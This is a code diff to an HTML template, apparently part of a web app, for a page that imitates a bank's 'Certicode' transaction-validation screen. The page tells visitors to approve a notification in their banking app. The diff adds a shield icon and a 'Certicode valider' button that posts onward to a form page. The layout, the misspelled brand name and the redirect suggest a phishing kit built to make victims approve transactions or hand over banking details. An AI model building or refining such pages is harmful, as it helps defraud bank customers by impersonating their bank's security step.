@@ -122,8 +122,9 @@
             line-height: 1.5;
         }
 
-        .ceticode-container img {
+        .ceticode-container .icon {
             width: 100px; /* Taille de l'icône */
+            height: 100px;
             margin: 20px 0;
             animation: pulse 1.5s infinite;
         }
@@ -133,6 +134,28 @@
             50% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
+
+        .btn-ceticode-valider {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background-color: #e60028;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-ceticode-valider:hover,
+        .btn-ceticode-valider:focus {
+            background-color: #cc001f;
+            outline: 2px solid #b3001f;
+            outline-offset: 2px;
+        }
+
 
         /* --- Pied de page (Footer) --- */
         .main-footer {
@@ -225,10 +248,17 @@
 
     <main class="main-content">
         <div class="ceticode-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/IOS_C%C3%A9tiCode_Icon.svg/1200px-IOS_C%C3%A9tiCode_Icon.svg.png" alt="Icône de l'application">
+            <!-- Remplacement de l'image cassée par une icône SVG de bouclier de sécurité -->
+            <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
             <h1>Validation en cours</h1>
             <p>Une notification a été envoyée sur votre application bancaire. Veuillez l'ouvrir et valider la transaction pour continuer.</p>
-            <p>Nous sommes en attente de votre validation...</p>
+
+            <!-- Ajout du formulaire et du bouton pour rediriger vers la page 'formulaire' -->
+            <form action="{{ url_for('ceticode_validation') }}" method="post">
+                <button type="submit" class="btn-ceticode-valider">Certicode valider</button>
+            </form>
         </div>
     </main>
 
